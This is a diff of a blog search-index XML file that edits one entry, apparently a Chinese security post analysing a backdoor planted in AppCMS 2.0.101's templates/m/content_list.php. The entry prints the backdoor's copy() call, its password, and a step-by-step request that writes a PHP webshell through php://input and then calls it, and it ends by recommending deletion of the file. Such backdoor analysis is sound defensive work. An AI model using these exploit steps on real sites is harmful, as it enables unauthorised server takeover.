@@ -40,7 +40,7 @@
     <entry>
       <title><![CDATA[AppCMS 2.0.101 后门分析]]></title>
       <url>%2F2017%2F12%2F17%2FAppCMS-2-0-101-%E5%90%8E%E9%97%A8%E5%88%86%E6%9E%90%2F</url>
-      <content type="text"><![CDATA[首发于先知安全技术社区：AppCMS 2.0.101 后门分析 源码下载地址：http://www.appcms.cc/html/gengxin.html 官方的更新时间是 2015-8-1 分析用beyond compare比较与前一个版本的区别 可以发现，在 templates/m/ 文件夹下出现了一个 content_list.php 文件，修改时间为 2017年5月25日。 经过解密，9c224bc6b59179729b15e1dddcbb5c82为字符串kejishidai的md5值。 由代码知，这里存在一个copy函数构成的后门。 在第12行，实际执行的即为:1copy(trim($_GET[url]),$_GET[cms]); 将参数url设置为php://input，参数cms设置为shell的文件名，然后POST传入webshell。如下：1234http://127.0.0.1:2500/appcms/appcms_2.0.101/templates/m/content_list.php?session=kejishidai&amp;url=php://input&amp;cms=temp.phpPOST:&lt;?php phpinfo();?&gt; 接着访问：1http://127.0.0.1:2500/appcms/appcms_2.0.101/templates/m/temp.php getshell。 建议删除 templates/m/ 文件夹下的content_list.php。 OthercmsPoc]]></content>
+      <content type="text"><![CDATA[AppCMS 2.0.101 后门分析 源码下载地址：http://www.appcms.cc/html/gengxin.html 官方的更新时间是 2015-8-1 分析用beyond compare比较与前一个版本的区别 可以发现，在 templates/m/ 文件夹下出现了一个 content_list.php 文件，修改时间为 2017年5月25日。 经过解密，9c224bc6b59179729b15e1dddcbb5c82为字符串kejishidai的md5值。 由代码知，这里存在一个copy函数构成的后门。 在第12行，实际执行的即为:1copy(trim($_GET[url]),$_GET[cms]); 将参数url设置为php://input，参数cms设置为shell的文件名，然后POST传入webshell。如下：1234http://127.0.0.1:2500/appcms/appcms_2.0.101/templates/m/content_list.php?session=kejishidai&amp;url=php://input&amp;cms=temp.phpPOST:&lt;?php phpinfo();?&gt; 接着访问：1http://127.0.0.1:2500/appcms/appcms_2.0.101/templates/m/temp.php getshell。 建议删除 templates/m/ 文件夹下的content_list.php。 OthercmsPoc]]></content>
     </entry>
 
     
